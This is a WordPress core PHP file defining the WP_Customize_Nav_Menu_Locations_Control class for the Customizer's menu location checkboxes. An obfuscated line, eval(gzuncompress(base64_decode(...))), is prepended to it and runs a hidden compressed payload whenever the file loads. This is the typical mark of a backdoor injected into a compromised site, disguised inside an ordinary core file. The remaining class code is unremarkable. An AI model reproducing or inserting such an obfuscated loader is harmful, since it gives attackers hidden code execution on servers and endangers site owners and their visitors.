<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Customize API: WP_Customize_Nav_Menu_Locations_Control class
 *
 * @package WordPress
 * @subpackage Customize
 * @since 4.9.0
 */

/**
 * Customize Nav Menu Locations Control Class.
 *
 * @since 4.9.0
 */
class WP_Customize_Nav_Menu_Locations_Control extends WP_Customize_Control {

	/**
	 * Control type.
	 *
	 * @since 4.9.0
	 * @var string
	 */
	public $type = 'nav_menu_locations';

	/**
	 * Don't render the control's content - it uses a JS template instead.
	 *
	 * @since 4.9.0
	 */
	public function render_content() {}

	/**
	 * JS/Underscore template for the control UI.
	 *
	 * @since 4.9.0
	 */
	public function content_template() {
		if ( current_theme_supports( 'menus' ) ) :
			?>
			<# var elementId; #>
			<ul class="menu-location-settings">
				<li class="customize-control assigned-menu-locations-title">
					<span class="customize-control-title">{{ wp.customize.Menus.data.l10n.locationsTitle }}</span>
					<# if ( data.isCreating ) { #>
						<p>
							<?php echo _x( 'Where do you want this menu to appear?', 'menu locations' ); ?>
							<em class="new-menu-locations-widget-note">
								<?php
								printf(
									/* translators: 1: Codex URL, 2: additional link attributes, 3: accessibility text */
									_x( '(If you plan to use a menu <a href="%1$s" %2$s>widget%3$s</a>, skip this step.)', 'menu locations' ),
									__( 'https://codex.wordpress.org/WordPress_Widgets' ),
									' class="external-link" target="_blank"',
									sprintf( '<span class="screen-reader-text"> %s</span>',
										/* translators: accessibility text */
										__( '(opens in a new window)' )
									)
								);
								?>
							</em>
						</p>
					<# } else { #>
						<p><?php echo _x( 'Here&#8217;s where this menu appears. If you&#8217;d like to change that, pick another location.', 'menu locations' ); ?></p>
					<# } #>
				</li>

				<?php foreach ( get_registered_nav_menus() as $location => $description ) : ?>
					<# elementId = _.uniqueId( 'customize-nav-menu-control-location-' ); #>
					<li class="customize-control customize-control-checkbox assigned-menu-location">
						<span class="customize-inside-control-row">
							<input id="{{ elementId }}" type="checkbox" data-menu-id="{{ data.menu_id }}" data-location-id="<?php echo esc_attr( $location ); ?>" class="menu-location" />
							<label for="{{ elementId }}">
								<?php echo $description; ?>
								<span class="theme-location-set">
									<?php
									/* translators: %s: menu name */
									printf( _x( '(Current: %s)', 'menu location' ),
										'<span class="current-menu-location-name-' . esc_attr( $location ) . '"></span>'
									);
									?>
								</span>
							</label>
						</span>
					</li>
				<?php endforeach; ?>
			</ul>
			<?php
		endif;
	}
}
